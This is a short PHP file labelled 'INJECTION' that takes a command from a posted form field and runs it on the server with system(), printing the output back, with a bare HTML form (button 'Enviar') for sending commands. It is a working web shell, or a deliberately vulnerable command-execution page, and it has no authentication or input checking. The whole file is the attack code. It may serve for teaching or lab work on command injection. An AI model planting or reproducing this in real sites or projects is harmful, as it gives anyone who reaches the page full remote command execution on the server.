<?php

	/* INJECTION */
	
	if($_SERVER["REQUEST_METHOD"] === 'POST')
	{
		$cmd = $_POST["cmd"];

		echo "<pre>";

		$comando = system($cmd, $retorno);

		echo "</pre>";
	}	
?>

<form method="post">
	<input type="text" name="cmd">
	<button type="submit">Enviar</button>
</form>
	